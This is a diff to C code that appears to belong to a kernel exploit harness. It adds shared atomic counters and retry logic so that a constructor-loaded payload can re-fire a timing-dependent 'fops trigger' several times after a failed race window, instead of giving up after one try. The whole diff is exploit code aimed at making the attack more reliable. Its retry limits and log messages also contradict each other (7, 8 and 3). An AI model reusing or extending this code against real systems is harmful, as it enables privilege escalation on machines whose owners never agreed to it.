@@ -22,6 +22,9 @@ struct app_p0_shared_state {
   atomic_int slide_ready;
   atomic_int p0_ready;
   atomic_int writer_started;
+  atomic_int write_landed;
+  atomic_int fops_retries;
+  atomic_int route_delay_index;
   _Atomic uintptr_t offset;
   _Atomic uintptr_t gate_page_struct;
   _Atomic uintptr_t probe_page_struct;
@@ -59,6 +62,33 @@ void app_publish_writer_started(void) {
   if (app_p0_state) {
     atomic_store(&app_p0_state->writer_started, 1);
   }
+}
+
+void app_publish_write_landed(int ok) {
+  if (app_p0_state && ok) {
+    atomic_store(&app_p0_state->write_landed, 1);
+  }
+}
+
+int app_fops_retry_count(void) {
+  if (!app_p0_state) {
+    return 0;
+  }
+  return atomic_load(&app_p0_state->fops_retries);
+}
+
+int app_route_delay_next_index(void) {
+  if (!app_p0_state) {
+    return 0;
+  }
+  return atomic_fetch_add(&app_p0_state->route_delay_index, 1);
+}
+
+int app_fops_retry_next(void) {
+  if (!app_p0_state) {
+    return 1;
+  }
+  return atomic_fetch_add(&app_p0_state->fops_retries, 1) + 1;
 }
 
 #endif
@@ -235,8 +265,21 @@ __attribute__((constructor)) static void load(void) {
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (atomic_load(&app_p0_state->writer_started)) {
-      pr_error("stack writer ran; refusing retry on this boot\n");
-      break;
+      if (atomic_load(&app_p0_state->write_landed)) {
+        pr_error("write landed; refusing further fops retries on this boot\n");
+        break;
+      }
+      /* The fops trigger never fired (window stayed closed): the injected
+       * waiter timed out and was dequeued, leaving the scheduler state as
+       * it was before the attempt.  Allow a bounded number of extra fops
+       * shots instead of wasting the boot on a single timing roll. */
+      if (app_fops_retry_count() >= 7) {
+        pr_error("fops trigger failed 8 times; refusing further retries\n");
+        break;
+      }
+      int shot = app_fops_retry_next();
+      pr_warning("fops trigger did not fire; retrying (fops shot %d/3)\n",
+                 shot);
     }
 #endif
 
